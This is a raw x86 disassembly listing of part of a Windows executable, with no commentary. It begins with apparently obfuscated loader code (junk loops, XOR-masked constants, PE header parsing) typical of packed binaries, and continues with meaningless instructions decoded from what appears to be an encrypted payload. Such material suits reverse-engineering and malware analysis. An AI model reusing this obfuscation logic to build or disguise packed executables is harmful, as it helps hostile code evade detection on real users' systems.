  4028aa:	push   DWORD PTR [ebp-0x24]
  4028ad:	push   0x43f7
  4028b2:	push   0x38dd
  4028b7:	push   DWORD PTR [ebp-0x10]
  4028ba:	push   0x3246
  4028bf:	push   0x510b
  4028c4:	push   0x8cd7
  4028c9:	push   DWORD PTR [ebp-0xc]
  4028cc:	push   0x63f7
  4028d1:	push   DWORD PTR [ebp-0x10]
  4028d4:	call   DWORD PTR ds:0x42e8bb
  4028da:	cmp    DWORD PTR ds:0x42d000,0x6
  4028e1:	jne    0x4028f4
  4028e7:	mov    ecx,DWORD PTR ds:0x42d000
  4028ed:	dec    ecx
  4028ee:	mov    DWORD PTR ds:0x42d000,ecx
  4028f4:	mov    ecx,DWORD PTR ds:0x42d000
  4028fa:	dec    ecx
  4028fb:	mov    DWORD PTR ds:0x42d000,ecx
  402901:	jmp    0x402880
  402906:	mov    ecx,0x751089b
  40290b:	xor    eax,ecx
  40290d:	cmp    eax,0xf89c85f0
  402912:	jne    0x402941
  402918:	mov    eax,DWORD PTR [ebp+0x8]
  40291b:	push   esi
  40291c:	mov    esi,DWORD PTR [ebp+0x8]
  40291f:	add    esi,DWORD PTR [eax+0x3c]
  402922:	mov    DWORD PTR [ebp+0x8],esi
  402925:	mov    eax,DWORD PTR [ebp-0x4]
  402928:	mov    esi,DWORD PTR [ebp+0x8]
  40292b:	xor    eax,ecx
  40292d:	add    eax,edx
  40292f:	cmp    DWORD PTR [esi+0x54],eax
  402932:	pop    esi
  402933:	je     0x402941
  402939:	mov    eax,DWORD PTR [ebp+0x8]
  40293c:	jmp    0x402948
  402941:	mov    eax,DWORD PTR [ebp-0x4]
  402944:	xor    eax,ecx
  402946:	add    eax,edx
  402948:	leave  
  402949:	ret    0x4
  40294c:	push   ebp
  40294d:	mov    ebp,esp
  40294f:	sub    esp,0x38
  402952:	xor    eax,eax
  402954:	xor    eax,DWORD PTR ds:0x42c00c
  40295a:	xor    DWORD PTR ds:0x42d010,eax
  402960:	mov    DWORD PTR [ebp-0x4],0xf89c8585
  402967:	and    DWORD PTR ds:0x429020,0x0
  402971:	jmp    0x402981
  402976:	mov    eax,ds:0x429020
  40297b:	inc    eax
  40297c:	mov    ds:0x429020,eax
  402981:	cmp    DWORD PTR ds:0x429020,0x12
  402988:	jae    0x4029d7
  40298e:	cmp    DWORD PTR ds:0x429020,0x4
  402995:	jne    0x4029b5
  40299b:	push   0x3575
  4029a0:	push   0x2056
  4029a5:	push   0x7cad
  4029aa:	push   0x3741
  4029af:	call   DWORD PTR ds:0x42e8e7
  4029b5:	cmp    DWORD PTR ds:0x429020,0x3
  4029bc:	jne    0x4029d0
  4029c2:	xor    eax,eax
  4029c4:	add    eax,DWORD PTR ds:0x429020
  4029ca:	inc    eax
  4029cb:	mov    ds:0x429020,eax
  4029d0:	jmp    0x402976
  4029d5:	not    eax
  4029d7:	push   ebx
  4029d8:	mov    DWORD PTR [ebp-0xc],0xf89c8584
  4029df:	mov    eax,DWORD PTR [ebp-0x4]
  4029e2:	add    DWORD PTR ds:0x42900c,0x42a018
  4029ec:	push   esi
  4029ed:	mov    esi,0x751089b
  4029f2:	xor    DWORD PTR ds:0x429018,0x429014
  4029fc:	xor    eax,esi
  4029fe:	sbb    DWORD PTR ds:0x42b000,0x77b
  402a08:	push   edi
  402a09:	mov    DWORD PTR ds:0x429018,0x1e
  402a13:	cmp    DWORD PTR ds:0x429018,0x0
  402a1a:	je     0x402a6e
  402a20:	cmp    DWORD PTR ds:0x429018,0xe
  402a27:	jne    0x402a42
  402a2d:	push   0x6dbc
  402a32:	push   0x42a004
  402a37:	push   0x657a
  402a3c:	call   DWORD PTR ds:0x42e8bf
  402a42:	cmp    DWORD PTR ds:0x429018,0xf
  402a49:	jne    0x402a5c
  402a4f:	mov    edi,DWORD PTR ds:0x429018
  402a55:	dec    edi
  402a56:	mov    DWORD PTR ds:0x429018,edi
  402a5c:	mov    edi,DWORD PTR ds:0x429018
  402a62:	dec    edi
  402a63:	mov    DWORD PTR ds:0x429018,edi
  402a69:	jmp    0x402a13
  402a6e:	mov    edi,0x3272e2
  402a73:	or     DWORD PTR ds:0x42a014,0x429014
  402a7d:	add    eax,edi
  402a7f:	adc    DWORD PTR ds:0x429008,0x42a018
  402a89:	mov    DWORD PTR [ebp-0x1c],eax
  402a8c:	movzx  eax,BYTE PTR ds:0x429010
  402a93:	xor    eax,DWORD PTR ds:0x42b00c
  402a99:	mov    ds:0x429010,eax
  402a9e:	mov    eax,DWORD PTR [ebp+0x14]
  402aa1:	test   eax,eax
  402aa3:	jmp    0x404df8
  402aa8:	retf   
  402aa9:	int    0x38
  402aab:	outs   dx,DWORD PTR ds:[esi]
  402aac:	cmp    cl,BYTE PTR [ebx-0x3abb3675]
  402ab2:	jae    0x402a43
  402ab4:	mov    al,ds:0x7cf682c4
  402ab9:	jl     0x402b37
  402abb:	jl     0x402af1
  402abd:	pop    edi
  402abe:	jl     0x402b3c
  402ac0:	adc    eax,0x1139172e
  402ac5:	and    eax,0x32652f13
  402aca:	popa   
  402acb:	pusha  
  402acc:	jg     0x402b49
  402ace:	ins    BYTE PTR es:[edi],dx
  402acf:	ins    BYTE PTR es:[edi],dx
  402ad0:	ins    DWORD PTR es:[edi],dx
  402ad1:	xor    al,0xc5
  402ad3:	fdivp  st(1),st
  402ad5:	push   0x42
  402ad7:	arpl   WORD PTR [ecx+0x53],di
  402ada:	stos   BYTE PTR es:[edi],al
  402adb:	jp     0x402b4a
  402add:	push   ecx
  402ade:	iret   
  402adf:	pop    ebp
  402ae0:	dec    esp
  402ae1:	cmp    cl,BYTE PTR [esi+0x577087fc]
  402ae7:	dec    ebp
  402ae8:	jg     0x402b21
  402aea:	mov    ah,BYTE PTR [eax+0x33a4ba7f]
  402af0:	jmp    DWORD PTR cs:[eax-0x22]
  402af4:	cld    
  402af5:	imul   edi,DWORD PTR [edi+0x18],0xffffffed
  402af9:	xor    ebp,ecx
  402afb:	mov    esp,0xd82b87ed
  402b00:	and    DWORD PTR [ecx],0xf
  402b03:	push   ecx
  402b04:	mov    ds:0x6df7c68c,eax
  402b09:	fld    QWORD PTR [esi]
  402b0b:	(bad)  
  402b0c:	or     ah,bh
  402b0e:	and    BYTE PTR [edx],dl
  402b10:	inc    edx
  402b11:	push   cs
  402b12:	and    BYTE PTR [ebx+0x62],ah
  402b15:	mov    cl,0xaf
  402b17:	sub    ebx,DWORD PTR [ecx+0x5]
  402b1a:	mov    al,ds:0x2341e1ff
  402b1f:	jbe    0x402b55
  402b21:	ret    0xf153
  402b24:	sbb    al,0xfc
  402b26:	jb     0x402ae1
  402b28:	jnp    0x402b07
  402b2a:	xchg   edx,eax
  402b2b:	pop    edi
  402b2c:	cmp    DWORD PTR [ecx+0x49841607],0xb
  402b33:	cwde   
  402b34:	ds je  0x402ac2
  402b37:	add    ebx,esp
  402b39:	sub    eax,0x4b368d54
  402b3e:	push   esi
  402b3f:	sti    
  402b40:	iret   
  402b41:	mov    WORD PTR [ecx],fs
  402b43:	or     edx,0x6982ceb7
  402b49:	out    0x45,al
  402b4b:	push   esp
  402b4c:	dec    esi
  402b4d:	push   cs
  402b4e:	cmp    BYTE PTR [ebx],cl
  402b50:	xor    BYTE PTR [ebx],bl
  402b52:	lods   eax,DWORD PTR ds:[esi]
  402b53:	inc    ebx
  402b54:	int3   
  402b55:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402b56:	dec    edx
  402b57:	fiadd  DWORD PTR [esi]
  402b59:	push   eax
  402b5a:	std    
  402b5b:	push   esp
  402b5c:	push   eax
  402b5d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402b5e:	icebp  
  402b5f:	bound  edi,QWORD PTR [edi+0x341544f2]
  402b65:	pop    ds
  402b66:	add    eax,0xe69f7da8
  402b6b:	popa   
  402b6c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402b6d:	imul   edx,edx,0xa5fbb13b
  402b73:	dec    edx
  402b74:	sti    
  402b75:	test   al,0xde
  402b77:	inc    ecx
  402b78:	add    al,0x8b
  402b7a:	(bad)  
  402b7b:	out    dx,al
  402b7c:	and    DWORD PTR [ebx+0x3d],esp
  402b7f:	mov    bh,0x60
  402b81:	jecxz  0x402b6b
  402b83:	jnp    0x402b7b
  402b85:	fldenv [ecx+0x2c]
  402b88:	add    ebp,edx
  402b8a:	fcom   DWORD PTR [eax]
  402b8c:	or     esi,0xffffffa4
  402b8f:	call   0x9dcd:0xee5b2168
  402b96:	sahf   
  402b97:	cld    
  402b98:	(bad)  
  402b99:	out    dx,al
  402b9a:	pop    ss
  402b9b:	out    0x5b,al
  402b9d:	xlat   BYTE PTR ds:[ebx]
  402b9e:	loopne 0x402b91
  402ba0:	and    eax,ebp
  402ba2:	inc    edi
  402ba3:	or     BYTE PTR [ebx+0x67],al
  402ba6:	cmp    edx,esi
  402ba8:	jecxz  0x402b5c
  402baa:	popf   
  402bab:	and    al,0xc8
  402bae:	dec    ebx
  402baf:	and    eax,0x573488ff
  402bb4:	jmp    0x402b63
  402bb6:	fsub   QWORD PTR ds:0x816c9e8a
  402bbc:	add    al,0xd0
  402bbe:	mov    dl,0xfe
  402bc0:	xchg   DWORD PTR [edx+0x1f169459],ebp
  402bc6:	jb     0x402be6
  402bc8:	pusha  
  402bc9:	xlat   BYTE PTR ds:[ebx]
  402bca:	in     al,0xf5
  402bcc:	jbe    0x402c38
  402bce:	lahf   
  402bcf:	fmul   DWORD PTR [edi*2+0x68a5f9ea]
  402bd6:	mov    bl,0xb6
  402bd9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402bda:	gs inc ecx
  402bdc:	cld    
  402bdd:	stos   DWORD PTR es:[edi],eax
  402bde:	xor    BYTE PTR [ebx],al
  402be0:	les    ebx,FWORD PTR [ecx]
  402be2:	loop   0x402c27
  402be4:	(bad)  
  402be5:	pop    ds
  402be6:	push   es
  402be7:	cmp    al,0x22
  402be9:	idiv   DWORD PTR [eax+0x61]
  402bec:	in     al,0x3f
  402bee:	fxch   st(4)
  402bf0:	push   ds
  402bf1:	sbb    eax,0x1315373a
  402bf6:	das    
  402bf7:	mov    cl,0xea
  402bf9:	xor    ecx,eax
  402bfb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402bfc:	xchg   esi,eax
  402bfd:	fwait
  402bfe:	dec    ebp
  402bff:	inc    ecx
  402c00:	shr    bl,1
  402c02:	retf   
  402c03:	fnstenv [ecx]
  402c05:	nop
  402c06:	dec    edi
  402c07:	adc    al,0xef
  402c09:	and    esp,esp
  402c0b:	cmp    DWORD PTR [eax],0x32476e98
  402c11:	add    DWORD PTR [ebp+0x25],0x7facf884
  402c18:	sub    BYTE PTR [eax+0x14],al
  402c1b:	jne    0x402c12
  402c1d:	push   ebp
  402c1e:	mov    DWORD PTR [edx],edi
  402c20:	(bad)  
  402c21:	(bad)  
  402c22:	sbb    dl,BYTE PTR [eax+0x9]
  402c25:	fldenv [ecx]
  402c27:	add    ah,BYTE PTR [edx-0x2b]
  402c2a:	cmp    DWORD PTR [esi-0x24deebc3],edx
  402c30:	cwde   
  402c31:	imul   edi,DWORD PTR [esi-0x1f5d78b6],0x14
  402c38:	push   esp
  402c39:	xor    eax,0xc151db5f
  402c3e:	test   BYTE PTR gs:[ebx+edi*4+0x5c],al
  402c43:	popa   
  402c44:	mov    edx,0xa95cf823
  402c49:	push   0x4a02dce3
  402c4e:	aam    0x14
  402c50:	hlt    
  402c51:	ss aam 0x4
  402c54:	test   BYTE PTR [ecx+0x9d3fd8c],bh
  402c5a:	into   
  402c5b:	out    dx,al
  402c5c:	push   DWORD PTR [ecx+0x5e]
  402c5f:	pop    edi
  402c60:	jae    0x402c48
  402c62:	cdq    
  402c63:	ja     0x402c9f
  402c65:	fs addr16 inc esi
  402c68:	out    dx,al
  402c69:	push   0x528012b1
  402c6e:	xchg   BYTE PTR [edx],bh
  402c70:	push   edx
  402c71:	and    eax,0xb09aa8b8
  402c76:	(bad)  
  402c77:	pop    edx
  402c78:	ret    0x44c8
  402c7b:	lds    edi,FWORD PTR [eax-0x6f]
  402c7e:	jae    0x402cdb
  402c80:	dec    eax
  402c81:	inc    edi
  402c82:	daa    
  402c83:	adc    al,0x52
  402c85:	xor    eax,0x865295af
  402c8a:	mov    esi,DWORD PTR [ebp+0x72]
  402c8d:	adc    BYTE PTR [ebp-0x4539249c],cl
  402c93:	idiv   DWORD PTR gs:[eax-0x6e]
  402c97:	pop    si
  402c99:	in     eax,0xdc
  402c9b:	and    DWORD PTR [eax+0x473ed8ea],0x80c95406
  402ca5:	pop    esi
  402ca6:	div    DWORD PTR [esi+edx*1+0xcddedea]
  402cad:	aad    0xa0
  402caf:	xor    DWORD PTR [edx-0x58],edx
  402cb2:	mov    ah,BYTE PTR [eax-0x71]
  402cb5:	adc    al,0x42
  402cb7:	inc    esi
  402cb8:	jmp    0x402c89
  402cba:	cmp    al,0x8c
  402cbc:	push   esp
  402cbd:	sahf   
  402cbe:	icebp  
  402cbf:	nop
  402cc0:	dec    ebp
  402cc1:	push   0xfffffff7
  402cc3:	cmp    eax,0xd3d7dbf2
  402cc8:	fisubr WORD PTR [ebp-0x9fb8632]
  402cce:	mov    cl,0x64
  402cd0:	imul   eax,DWORD PTR ds:0x28739835,0xb006f3
  402cda:	dec    edi
  402cdb:	mov    ebx,0xdf03e753
  402ce0:	cdq    
  402ce1:	ret    
  402ce2:	mov    DWORD PTR [eax+0x14c78690],ebp
  402ce8:	or     BYTE PTR [esp+ebx*4-0x53930238],0x21
  402cf0:	mul    DWORD PTR [esi-0x56]
  402cf3:	sub    DWORD PTR [ecx],edx
  402cf5:	bnd call 0xebb4dd98
  402cfb:	shr    DWORD PTR [edi-0x5c],0xab
  402cff:	pop    esp
  402d00:	mov    eax,fs
  402d02:	pop    edi
  402d03:	inc    esp
  402d04:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402d05:	dec    edx
  402d06:	mov    dl,0x5f
  402d08:	int3   
  402d09:	loope  0x402cfc
  402d0b:	push   0x63
  402d0d:	and    al,0xe2
  402d0f:	sub    DWORD PTR [ecx-0x22],0x4a
  402d13:	cwde   
  402d14:	mov    ch,0xdb
  402d16:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402d17:	jle    0x402d8b
  402d19:	arpl   bx,ax
  402d1b:	xor    eax,0x77222c7
  402d20:	mov    edi,0xf837fe10
  402d25:	test   BYTE PTR [edx],0x2f
  402d28:	pop    ds
  402d29:	add    DWORD PTR [edx],edx
  402d2b:	ins    BYTE PTR es:[edi],dx
  402d2c:	scas   al,BYTE PTR es:[edi]
  402d2d:	push   esi
  402d2e:	and    ebx,ecx
  402d30:	retf   0x2a22
  402d33:	cli    
  402d34:	icebp  
  402d35:	sub    dl,cl
  402d37:	out    dx,eax
  402d38:	cld    
  402d39:	aad    0x2a
  402d3b:	mov    edi,?
  402d3d:	outs   dx,DWORD PTR ds:[esi]
  402d3e:	cmp    esp,DWORD PTR [esp+eiz*2-0x7cdbcf21]
  402d45:	js     0x402ce1
  402d47:	(bad)
  402d4a:	ror    BYTE PTR [edi+0x3c9eee1f],1
  402d50:	std    
  402d51:	ja     0x402dbb
  402d53:	sbb    al,0x23
  402d55:	rcr    BYTE PTR [eax],0x30
  402d58:	jle    0x402d5b
  402d5a:	bound  edx,QWORD PTR [ebx+0x7f3e8153]
  402d60:	mov    dl,0xe2
  402d62:	jae    0x402d7c
  402d64:	adc    ch,BYTE PTR [ecx]
  402d66:	xchg   edx,eax
  402d67:	push   0x317d3e71
  402d6c:	(bad)  
  402d6d:	adc    eax,0x240e32aa
  402d72:	or     DWORD PTR [edi],edi
  402d74:	test   ebp,ebp
  402d76:	fiadd  DWORD PTR [ecx-0x377f0fff]
  402d7c:	mov    BYTE PTR [edi+0x5a4c1c6e],0x2c
  402d83:	popf   
  402d84:	fcom   QWORD PTR [edx+eiz*1+0x50]
  402d88:	fst    QWORD PTR [esi]
  402d8a:	sti    
  402d8b:	lds    edi,FWORD PTR [ebp+0x2b]
  402d8e:	fldcw  WORD PTR [esi]
  402d90:	shl    ecx,1
  402d92:	adc    dl,BYTE PTR [ebp+0x30021279]
  402d98:	and    eax,0xb2985bc7
  402d9d:	in     eax,dx
  402d9e:	xchg   esi,eax
  402d9f:	mov    esp,0xf4750e1a
  402da4:	add    ecx,ecx
  402da6:	fcmove st,st(7)
  402da8:	repz xchg ecx,eax
  402daa:	sbb    dl,cl
  402dac:	push   esi
  402dad:	aaa    
  402dae:	push   ss
  402daf:	mov    cl,0x43
  402db1:	xchg   ecx,eax
  402db2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402db3:	enter  0x3188,0x54
  402db7:	pop    ecx
  402db8:	push   DWORD PTR [edi-0x79900ac9]
  402dbe:	cmp    ebx,ebx
  402dc0:	adc    ch,BYTE PTR [ecx-0x5df96f8]
  402dc6:	out    0xaf,eax
  402dc8:	cli    
  402dc9:	js     0x402e1c
  402dcb:	sub    BYTE PTR [di-0x45a2],dl
  402dd0:	ss leave 
  402dd2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402dd3:	jno    0x402d90
  402dd5:	call   0x8fe8:0x81016b3a
  402ddc:	push   edi
  402ddd:	push   cs
  402dde:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402ddf:	retf   
  402de0:	dec    BYTE PTR [edi-0x65]
  402de3:	ret    0x19d3
  402de6:	scas   al,BYTE PTR es:[edi]
  402de7:	jmp    0x2830690b
  402dec:	stos   BYTE PTR es:[edi],al
  402ded:	xor    al,0xf7
  402def:	js     0x402de3
  402df1:	and    eax,0xaf92c3e1
  402df6:	leave  
  402df7:	dec    ebp
  402df8:	xchg   ecx,eax
  402df9:	pop    bp
  402dfb:	popf   
  402dfc:	mov    ah,0x8b
  402dfe:	pusha  
  402dff:	sub    ebx,ecx
  402e01:	(bad)  
  402e02:	mov    al,ds:0xe844f854
  402e07:	sub    eax,0xd5651164
  402e0c:	adc    al,0x73
  402e0e:	rcl    BYTE PTR [esi],1
  402e10:	pop    edx
  402e11:	cmp    al,0x10
  402e13:	inc    edx
  402e14:	mov    dh,0x6
  402e16:	push   edi
  402e17:	jae    0x402e80
  402e19:	xor    ah,dh
  402e1b:	gs mov esp,0x85e8a68b
  402e21:	dec    ebp
  402e22:	adc    bl,0x28
  402e25:	les    ebp,FWORD PTR [edi+0x40ff016f]
  402e2b:	pop    eax
  402e2c:	xchg   edi,eax
  402e2d:	mov    esp,0x3ba2c186
  402e32:	pop    ds
  402e33:	and    BYTE PTR [ebx],ah
  402e35:	or     DWORD PTR [ebx+0x74],eax
  402e38:	stc    
  402e39:	int    0xbb
  402e3b:	stos   DWORD PTR es:[edi],eax
  402e3c:	fs in  eax,0x18
  402e3f:	ins    BYTE PTR es:[edi],dx
  402e40:	shr    BYTE PTR [eax],0xec
  402e43:	add    BYTE PTR [esi+0x19028906],bh
  402e49:	pop    edi
  402e4a:	lea    esi,[ecx-0x44]
  402e4d:	enter  0xfb15,0x4
  402e51:	jmp    0x3f70f0aa
  402e56:	sbb    dl,BYTE PTR [edi]
  402e58:	xor    DWORD PTR [esp+eax*1-0x4b00f19],edi
  402e5f:	or     esi,DWORD PTR [ebx+0x34]
  402e62:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402e63:	fwait
  402e64:	cmp    BYTE PTR [ecx],cl
  402e66:	adc    eax,0xf10fc8f6
  402e6b:	pop    edi
  402e6c:	xchg   ebx,eax
  402e6d:	and    al,0xe9
  402e6f:	jmp    0xd9e19ee1
  402e74:	rcl    DWORD PTR [edi+0x72],0x58
  402e78:	jns    0x402e83
  402e7a:	pop    edi
  402e7b:	push   0x560d8aec
  402e80:	jo     0x402eb2
  402e82:	ror    DWORD PTR [esi+0x8],0xa1
  402e86:	outs   dx,DWORD PTR ds:[esi]
  402e87:	pushf  
  402e88:	inc    esi
  402e89:	fsub   st(6),st
  402e8b:	mov    edx,0x2f6d764f
  402e90:	call   0xccb8:0x64a4e2bd
  402e97:	arpl   WORD PTR [ebp+0x7b08a661],cx
  402e9d:	int3   
  402e9e:	mov    ds:0xbf0a3da1,eax
  402ea3:	mov    dl,0x6d
  402ea5:	push   ss
  402ea6:	ins    BYTE PTR es:[edi],dx
  402ea7:	pop    esi
  402ea8:	jo     0x402e83
  402eaa:	das    
  402eab:	sbb    dh,BYTE PTR [eax-0x36da50d0]
  402eb1:	in     eax,0xfb
  402eb3:	fbld   TBYTE PTR [edx+0x7a67639e]
  402eb9:	(bad)  
  402eba:	repnz inc eax
  402ebc:	out    dx,eax
  402ebd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402ebe:	pop    ds
  402ebf:	outs   dx,DWORD PTR ds:[esi]
  402ec0:	or     al,0xe5
  402ec2:	inc    edx
  402ec3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402ec4:	xlat   BYTE PTR ds:[ebx]
  402ec5:	pop    ss
  402ec6:	jle    0x402ee9
  402ec8:	fldenv [ebx-0x5398ffae]
  402ece:	mov    ds:0x8276784b,al
  402ed3:	jnp    0x402f4d
  402ed5:	sub    eax,0xe3ff0b6d
  402eda:	mov    cl,0xf0
  402edc:	jp     0x402ec3
  402ede:	data16 mov ds,WORD PTR [eax]
  402ee1:	push   0xffffffff
  402ee3:	push   0xffffff82
  402ee5:	jb     0x402f03
  402ee7:	sbb    BYTE PTR [edi-0x7f],dh
  402eea:	leave  
  402eeb:	xchg   ecx,eax
  402eec:	xchg   esp,eax
  402eed:	mov    edi,0x748a456c
  402ef2:	stos   DWORD PTR es:[edi],eax
  402ef3:	dec    eax
  402ef4:	(bad)  
  402ef6:	lahf   
  402ef7:	xor    al,0x36
  402ef9:	scas   eax,DWORD PTR es:[edi]
  402efa:	out    0xa1,al
  402efc:	enter  0x546,0x31
  402f00:	mov    ebp,0xed50e3b3
  402f05:	mov    cl,0x12
  402f07:	in     eax,dx
  402f08:	fbstp  TBYTE PTR [eax-0x7f]
  402f0b:	adc    dh,BYTE PTR [edx]
  402f0d:	hlt    
  402f0e:	shl    BYTE PTR [eax+ecx*1+0x52923a6a],cl
  402f15:	and    al,0x7a
  402f17:	jb     0x402f2a
  402f19:	pop    ebx
  402f1a:	leave  
  402f1b:	xor    BYTE PTR [edx],dl
  402f1d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402f1e:	dec    edi
  402f1f:	ss fsubr QWORD PTR ss:[ebp-0x5f3c9c51]
  402f27:	retf   
  402f28:	scas   eax,DWORD PTR es:[edi]
  402f29:	add    al,bh
  402f2b:	bndstx [ecx],bnd3
  402f2e:	add    DWORD PTR [ecx],ebp
  402f30:	sbb    ebp,DWORD PTR [eax+0xd721c1]
  402f36:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402f37:	pop    edx
  402f38:	sub    esp,esi
  402f3a:	mov    edx,0xb5709a1b
  402f3f:	out    0xd8,eax
  402f41:	das    
  402f42:	into   
  402f43:	adc    dh,0x5c
  402f46:	cmp    DWORD PTR [ebx+0x48],eax
  402f49:	add    ebx,DWORD PTR [ebp-0x3]
  402f4c:	sub    edi,ebx
  402f4e:	int    0x66
  402f50:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402f51:	mov    al,0x4e
  402f53:	adc    eax,0xbb18f4f2
  402f58:	jb     0x402f76
  402f5a:	(bad)  
  402f5b:	mov    ebp,0x24c46136
  402f60:	adc    BYTE PTR ds:0x2ba55f9d,bl
  402f66:	pop    ecx
  402f67:	scas   al,BYTE PTR es:[edi]
  402f68:	cmp    ebp,DWORD PTR [edi+ebx*4]
  402f6b:	imul   ecx,ecx,0xdf68045c
  402f71:	rcr    ah,0xb9
  402f74:	sbb    DWORD PTR [ebp-0x16141046],esp
  402f7a:	fld    TBYTE PTR [ecx+0x3a61c6f2]
  402f80:	(bad)  
  402f81:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402f83:	mov    eax,0x8c3cfd64
  402f88:	inc    edi
  402f89:	js     0x402f6c
  402f8b:	dec    esp
  402f8c:	xor    ah,BYTE PTR [ebx]
  402f8e:	dec    eax
  402f8f:	push   ecx
  402f90:	jp     0x402f22
  402f92:	jbe    0x402f97
  402f94:	mul    DWORD PTR [ecx+eiz*1+0x16]
  402f98:	or     ebp,DWORD PTR [ecx-0x463fe189]
  402f9e:	in     al,dx
  402f9f:	adc    DWORD PTR gs:[eax+ebx*2],ecx
  402fa3:	cmp    al,0x43
  402fa5:	sahf   
  402fa6:	lds    ebp,FWORD PTR [ebx-0x23]
  402fa9:	cs dec eax
  402fab:	sar    bl,1
  402fad:	sub    al,bh
  402faf:	lock xchg ecx,eax
  402fb1:	jb     0x402f72
  402fb3:	pop    esi
  402fb4:	cmp    BYTE PTR ds:0x7dda0f97,bh
  402fba:	aaa    
  402fbb:	sar    DWORD PTR [edi-0x25],cl
  402fbe:	or     eax,0x49367cf7
  402fc3:	jp     0x403006
  402fc5:	pusha  
  402fc6:	cmp    edi,DWORD PTR ds:[edi-0x3d07866]
  402fcd:	je     0x402fdc
  402fcf:	xor    al,0x6
  402fd1:	sub    al,cl
  402fd3:	cdq    
  402fd4:	(bad)  
  402fd5:	div    DWORD PTR [ebp+0x13]
  402fd8:	das    
  402fd9:	jns    0x402f62
  402fdb:	push   0x89777cb7
  402fe0:	sbb    DWORD PTR [ebp+esi*2-0x11],edi
  402fe4:	leave  
  402fe5:	mov    dl,0x25
  402fe7:	mov    ebx,0x5ce909fd
  402fec:	sahf   
  402fed:	ret    
  402fee:	push   es
  402fef:	push   esi
  402ff0:	cmp    al,BYTE PTR [ebp-0x2a96aa29]
  402ff6:	or     cl,ah
  402ff8:	mov    edi,0x52262168
  402ffd:	adc    eax,0x23880d02
  403002:	repz jb 0x403075
  403005:	(bad)  
  403007:	adc    ebp,DWORD PTR [edi]
  403009:	pushf  
  40300a:	into   
  40300b:	scas   eax,DWORD PTR es:[edi]
  40300c:	add    al,0x7
  40300e:	call   0x1d0bad2
  403013:	and    edx,DWORD PTR [edx]
  403015:	add    ah,BYTE PTR [edi+0xe]
  403018:	and    DWORD PTR [edi+0x1d3331c3],edi
  40301e:	test   eax,0x27a8914a
  403023:	push   0xffffff8d
  403025:	mov    ch,0x73
  403027:	push   edi
  403028:	mov    cl,0x54
  40302a:	pop    ds
  40302b:	pop    ds
  40302c:	mov    ah,0x78
  40302e:	pop    ebx
  40302f:	dec    edx
  403030:	pop    ecx
  403031:	jnp    0x403059
  403033:	push   ebx
  403034:	sbb    cl,dh
  403036:	pop    ebp
  403037:	outs   dx,BYTE PTR ds:[esi]
  403038:	mov    edi,0x8bea2e51
  40303d:	pusha  
  40303e:	push   edx
  40303f:	jbe    0x402fc8
  403041:	lods   al,BYTE PTR ds:[si]
  403043:	push   edi
  403044:	xor    al,0x44
  403046:	mov    dl,0xdd
  403048:	xchg   DWORD PTR [edi+0x6c8f704e],edx
  40304e:	cmp    DWORD PTR [ebp-0x14a68549],ebx
  403054:	jno    0x4030a8
  403056:	inc    ecx
  403057:	jecxz  0x403071
  403059:	and    ah,bl
  40305b:	xchg   DWORD PTR [eax],eax
  40305d:	shr    BYTE PTR ds:0x7fcb25e9,0xb3
  403064:	sub    BYTE PTR [esp+edx*2-0x55],0xd4
  403069:	add    bh,cl
  40306b:	pop    ds
  40306c:	fadd   st,st(7)
  40306e:	push   es
  40306f:	fiadd  DWORD PTR [ecx+0x34e70019]
  403075:	ja     0x4030d6
  403077:	dec    edi
  403078:	xor    al,0x28
  40307a:	xlat   BYTE PTR ds:[ebx]
  40307b:	imul   ebp,DWORD PTR [ecx+0x11],0xffffffbc
  40307f:	pop    esp
  403080:	dec    ebx
  403081:	js     0x4030b0
  403083:	mov    ch,0xfb
  403085:	push   cs
  403086:	jae    0x403082
  403088:	push   edi
  403089:	add    BYTE PTR [ebx],dl
  40308b:	out    dx,eax
  40308c:	pop    ebx
  40308d:	enter  0xf4cd,0x83
  403091:	add    edi,DWORD PTR [eax]
  403093:	cmp    BYTE PTR [edx+0x3b20b92c],dh
  403099:	pop    ebx
  40309a:	aam    0x38
  40309c:	or     al,0xea
  40309e:	add    al,0xf1
  4030a0:	rol    BYTE PTR [eax+0x7623a860],1
  4030a6:	out    0x11,al
  4030a8:	mov    esi,DWORD PTR [edx-0x56f74948]
  4030ae:	adc    al,0xb8
  4030b0:	lods   al,BYTE PTR ds:[esi]
  4030b1:	jg     0x403084
  4030b3:	pop    ss
  4030b4:	int    0x34
  4030b6:	div    BYTE PTR [esi-0x1a7bf641]
  4030bc:	lahf   
  4030bd:	imul   ebx,DWORD PTR [esi-0x42e625de],0x2543a95
  4030c7:	pop    edx
  4030c8:	retf   0xf91f
  4030cb:	retf   0x5add
  4030ce:	adc    ch,ch
  4030d0:	xchg   esi,eax
  4030d1:	cdq    
  4030d2:	xchg   esi,eax
  4030d3:	xchg   esi,eax
  4030d4:	mov    ebp,0xaeb27873
  4030d9:	repz sbb edi,DWORD PTR [bx+0x6751]
  4030df:	xlat   BYTE PTR ds:[ebx]
  4030e0:	or     al,0x74
  4030e2:	outs   dx,DWORD PTR ds:[esi]
  4030e3:	cmp    bl,al
  4030e5:	js     0x4030c3
  4030e7:	mov    ecx,edx
  4030e9:	or     edx,eax
  4030eb:	mov    dl,0xbf
  4030ed:	cmp    eax,0xe653694
  4030f2:	les    ebp,FWORD PTR [ecx-0xf]
  4030f5:	(bad)  
  4030f6:	clc    
  4030f7:	push   ecx
  4030f8:	adc    ebx,DWORD PTR [edx]
  4030fa:	inc    ecx
  4030fb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
